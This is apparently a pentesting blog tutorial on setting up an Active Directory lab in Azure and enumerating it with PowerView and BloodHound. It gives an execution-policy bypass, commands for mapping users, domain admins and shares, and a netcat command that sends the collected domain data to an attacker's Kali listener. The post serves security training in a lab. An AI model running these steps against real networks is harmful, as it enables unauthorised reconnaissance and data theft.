Setup of an Active Directory lab within Azure. Enumeration of lab with PowerView and Bloodhound setup/usage.

----------

Legal Usage: The information provided by executeatwill is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “ethical hacker” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.
By continued reading, you acknowledge the aforementioned user risks/responsibilities.

----------

Based off TheCyberMentor amazing Udemy course available at [https://www.udemy.com/course/practical-ethical-hacking/](https://www.udemy.com/course/practical-ethical-hacking/)

## Setup an Active Directory/Domain Controller within Azure:
- Great Setup Guide by [Kamran Bilgrami](https://medium.com/@kamran.bilgrami?source=post_page-----6c67a7eddd7f----------------------)

Link: https://medium.com/@kamran.bilgrami/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-[6c67a7eddd7f](https://medium.com/@kamran.bilgrami/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f)

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1578289811856_image.png)




With credentials recovered from the mitm attack we can use tools 

Tools:

- PowerView — Link: [https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
- Bloodhound


## Using PowerView

Download `PowerView.ps1` to target
Execute policy bypass (used to execute scripts - not security)

    powershell -ep bypass

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577714828669_image.png)


Execute PowerView

    . .\PowerView.ps1

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577714901801_image.png)


*Very powerful tool with more information available via cheat sheet:*

https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993


[https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

**Get Domain Policy:**

    Get-DomainPolicy

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577770468780_image.png)




    Get-NetDomain

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577770510249_image.png)



    Get-DomainPolicy
    (Get-DomainPolicy)."system access"

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577770563891_image.png)


*find password length and just start attacking with 7 chars passwords.*


**Find Users:**

    Get-NetUser

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577770615073_image.png)


*Long semi unreadable list*

Refined list:

    Get-NetUser | select cn
    Get-NetUser | select samaccountname
    Get-NetUser | select description #find if any passwords in cleartext

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577770669849_image.png)

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577770721395_image.png)


**List property we can search for via pipe:**

    Get-UserProperty

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577770804832_image.png)


**Find properties of the passwords last set:**

    Get-UserProperty -Properties pwdlastset

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577770885337_image.png)


*can find if we have stale passwords on the network.*

**Check Logon Count (used to identify honeypot accounts):**

    Get-UserProperty -Properties logoncount

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577770956461_image.png)


**Check bad password counts (You can see if an account is under attack):**

    Get-UserProperty -Properties badpwdcount

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577771047270_image.png)


**List all network domain computers:**

    Get-NetComputer

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577771290426_image.png)


more information:

    Get-NetComputer -FullData

*Slightly too much information*

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577771359603_image.png)


**Find the operating systems:**

    Get-NetComputer -FullData | Select OperatingSystem

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577771409475_image.png)


*Pick apart the network as to which are the servers.*

Find Domain Admins

    Get-NetGroup -GroupName *admin*

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577771561944_image.png)


**Get Members of Admins**

    Get-NetGroupMember -GroupName "Domain Admins"

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577771645744_image.png)


**Find All SMB Shares on the Network:**

    Invoke-ShareFinder

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577771704979_image.png)



Find All Group Policies:

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577771885526_image.png)



**Check GPO for changes in displaynames and when they were changed:**

    Get-NetGPO | select displayname, whenchanged

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577772009597_image.png)


*condensed version of larger output.*



## Bloodhound

Downloads the data from Active Directory and put into a visual graph.

    apt install bloodhound

neo4j console
setup neo4j - change default passwords

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577782937684_image.png)


open at link:

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577782976942_image.png)


login with `neo4j:neo4j` - prompted to change password

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577783026753_image.png)


*opted to used kali password.*

 **Neo4j Dashboard**

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577783062510_image.png)


**Launch Bloodhound - Linux/Kali**

    bloodhound

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577783141364_image.png)


Login with neo4j account and neo4j account URL. - Bloodhoud setup and next step to pull data with injester.

 **Pull data with In-jester**

- invoke bloodhound - powershell 

Link: [https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1)


- Place onto windows 10 machine

Within command prompt setup ep bypass

    powershell -ep bypass

Call Sharphound.ps1

    . .\Sharphound.ps1

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577783538070_image.png)


Invoke Sharphound

    Invoke-Bloodhound -CollectionMethod All -Domain MARVEL.local -ZipFileName file.zip

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577784418100_image.png)


Move file to kali - Used `nc` file transfer method - downloaded `nc.exe` via SimpleHTTPServer on kali.

nc File Transfer Method:

- Kali setup listener:
    ncat -lvp 80 > file.zip

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577786052957_image.png)

- Windows 10 machine
    nc -nv 192.168.175.129 80 < file.zip -w15

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577786102033_image.png)


file received:

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577786188527_image.png)


 **Import file.zip into Bloodhound**
Upload file.zip via upload button within bloodhound:

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577786521879_image.png)


*at this point my Bloodhound crashed when loading file.zip to which I attempted to reinstall… and failed. Moved to create for source… failed. All mainly due to the fact that i was on x86 version of Kali. Moved to Install Bloodhound on a Windows 10 machine following these directions:*

[https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/](https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/)

Neoj4 BloodHound issues:

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577793203986_image.png)


*IMPORTANT: When you install java on the machine you will need to edit line 75:*

    C:\Users\fcastle\Downloads\neo4j-community-3.5.14-windows\neo4j-community-3.5.14\bin\Neo4j-Management\Get-Java.ps1

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577793031185_image.png)


*and within the java folder you need to copy the “client” folder and paste it as “server”:*

    C:\Program Files (x86)\Java\jre1.8.0_231\bin

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577793127854_image.png)


**Launch Bloodhound - Windows**

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577793265535_image.png)


From this point was able to load the `file.zip` into BloodHound:

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577793298311_image.png)


**Queries:**
Finding domain admins via “Find all Domain Admins” query

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577793434481_image.png)


You will want to target boxes with Domain Admins have accounts.


- Locating High Value Targets via Query

![](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577793675140_image.png)


*to which paths get illuminated in red to follow*

![highlighted via course map](https://paper-attachments.dropbox.com/s_D94CB79C33A1BA2B22BD21F66E8B42DCFAD52B114B1A46DC9EDFB5A1D4A8136D_1577793717542_image.png)


Once a network is compromised you can plan your next target with Bloodhound.

